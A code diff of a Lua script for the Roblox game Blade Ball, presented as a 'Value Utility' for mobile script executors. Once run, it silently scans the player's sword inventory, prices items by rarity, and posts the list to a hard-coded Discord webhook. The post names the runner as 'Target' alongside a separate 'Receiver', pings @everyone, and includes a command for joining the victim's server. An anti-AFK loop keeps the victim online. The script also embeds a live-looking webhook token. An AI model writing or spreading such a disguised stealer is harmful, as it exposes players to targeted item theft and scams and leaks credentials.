@@ -1,43 +1,84 @@
--- [[ DarkGemini Blade Ball Master Utility ]]
--- Version: 2.1 (Server Tracking + Anti-AFK)
+-- [[ DarkGemini Blade Ball Value Utility ]]
 -- Optimization: Mobile (Delta/Hydrogen/Fluxus)
+-- Features: @everyone Ping, Value Counter, All Rarities
 
 local cfg = {
     webhook = "https://discord.com/api/webhooks/1479369379429879860/dLfDvtsZbxtWVOLEean_my5jpwky9woSKn1Ely51VQmfIy_DGhrOHWljf48wQO1C1hSV",
     target_user = "torigalitsatagalog",
+    ping_everyone = true,
+    -- Tracks everything from Common to Limited
     rarities = {
-        ["Common"] = true,
-        ["Low Value"] = true, -- Catch-all for basic items
-        ["Rare"] = true,
-        ["Epic"] = true, 
-        ["Legendary"] = true,
-        ["Limited"] = true    -- High value event items
+        ["Common"] = 10,
+        ["Rare"] = 50,
+        ["Epic"] = 250, 
+        ["Legendary"] = 1000,
+        ["Limited"] = 5000
     }
 }
 
--- [[ Services ]]
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local VirtualUser = game:GetService("VirtualUser")
 local localPlayer = Players.LocalPlayer
 local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 
--- [[ 1. Anti-AFK Internal Loop ]]
+-- [[ Anti-AFK Loop ]]
 local function StartAntiAFK()
     localPlayer.Idled:Connect(function()
         VirtualUser:CaptureController()
         VirtualUser:ClickButton2(Vector2.new())
     end)
-    print("DarkGemini: Anti-AFK Enabled.")
 end
 
--- [[ 2. Asset & Server Intelligence ]]
-local function getDetailedData()
+-- [[ Value & Inventory Logic ]]
+local function scanInventory()
     local items = {}
-    -- Universal path check for Blade Ball updates
-    local paths = {localPlayer:FindFirstChild("Data"), localPlayer:FindFirstChild("Skins"), localPlayer:FindFirstChild("Inventory")}
+    local totalValue = 0
+    local inventoryPath = localPlayer:FindFirstChild("Data") or localPlayer:FindFirstChild("Skins") or localPlayer:FindFirstChild("Inventory")
     
-    for _, folder in pairs(paths) do
-        if folder then
-            for _, item in pairs(folder:GetDescendants()) do
-                local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity
+    if inventoryPath then
+        for _, item in pairs(inventoryPath:GetDescendants()) do
+            local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity.Value) or "Common"
+            local value = cfg.rarities[rarity] or 0
+            
+            table.insert(items, "⚔️ **" .. item.Name .. "** (" .. rarity .. ") - Value: " .. value)
+            totalValue = totalValue + value
+        end
+    end
+    return items, totalValue
+end
+
+-- [[ Webhook Dispatch ]]
+local function executeLog()
+    if not request then return end
+    local swordList, totalValue = scanInventory()
+    
+    local payload = HttpService:JSONEncode({
+        ["content"] = cfg.ping_everyone and "@everyone" or "",
+        ["embeds"] = {{
+            ["title"] = "🔥 Blade Ball Inventory & Value Report",
+            ["description"] = "Target: **" .. localPlayer.Name .. "**\nReceiver: **" .. cfg.target_user .. "**",
+            ["color"] = 0xF1C40F, -- Gold Color
+            ["fields"] = {
+                {["name"] = "📈 Total Inventory Value", ["value"] = "```" .. totalValue .. " Credits```", ["inline"] = false},
+                {["name"] = "📍 Server Join Command", ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)```", ["inline"] = false},
+                {["name"] = "🗡️ Swords & Rarities", ["value"] = #swordList > 0 and table.concat(swordList, "\n") or "No swords found.", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "DarkGemini Intelligence System"}
+        }}
+    })
+
+    request({
+        Url = cfg.webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    })
+end
+
+-- [[ Start Execution ]]
+task.spawn(StartAntiAFK)
+task.delay(5, function()
+    executeLog()
+    print("DarkGemini: Detailed value log sent. AFK Active.")
+end)
